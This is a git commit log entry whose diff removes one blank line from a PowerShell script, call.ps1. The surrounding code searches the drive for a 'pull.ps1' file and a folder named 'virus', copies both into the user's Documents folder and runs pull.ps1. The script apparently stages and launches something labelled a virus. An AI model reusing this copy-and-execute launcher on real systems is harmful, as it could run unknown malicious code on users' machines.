99a1e4db1a261c4a08bdd299848640595a01db2a
Mavis Coffey <masoncoffey777@gmail.com>
2024-11-07 09:47:13 -0500

    Removed extra line from call.ps1

--- call.ps1
+++ call.ps1
@@ -7,7 +7,6 @@ $pullPathBeforeCopy = Get-ChildItem -Path C:\ -Recurse -Filter "pull.ps1"
 $pathBeforeCopy = Get-ChildItem -Path C:\Users\$localUsername -Directory -Recurse -Filter "virus"
 $pathAfterCopy = "C:\Users\$localUsername\Documents\virus"
 
-
 Copy-Item -Path $pathBeforeCopy -Destination $pathAfterCopy -Recurse
 Copy-Item -Path $pullPathBeforeCopy -Destination $pathAfterCopy\Virus
 & "$pathAfterCopy\Virus\pull.ps1"
